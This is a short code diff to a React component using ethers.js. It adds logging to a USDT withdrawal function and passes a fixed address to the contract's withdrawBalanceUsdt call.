@@ -73,13 +73,17 @@ export default function Ethers({children}){
 
       const withdrawUsdt = async()=>{
         try{
+          console.log("withdraw-2")
           const { ethereum } = window
           const provider = new ethers.providers.Web3Provider(ethereum)
           const signer = provider.getSigner()
           const contract = new ethers.Contract(contractAddress, abi,signer)
-           const s1 = await contract.withdrawBalanceUsdt()
+           const s1 = await contract.withdrawBalanceUsdt("0x41839BC0DBA60f0a06deCdab2a655b1DB339C76C")
            s1.wait()
-        }catch(e){}
+
+        }catch(e){
+          console.log(e)
+        }
        
       }
 
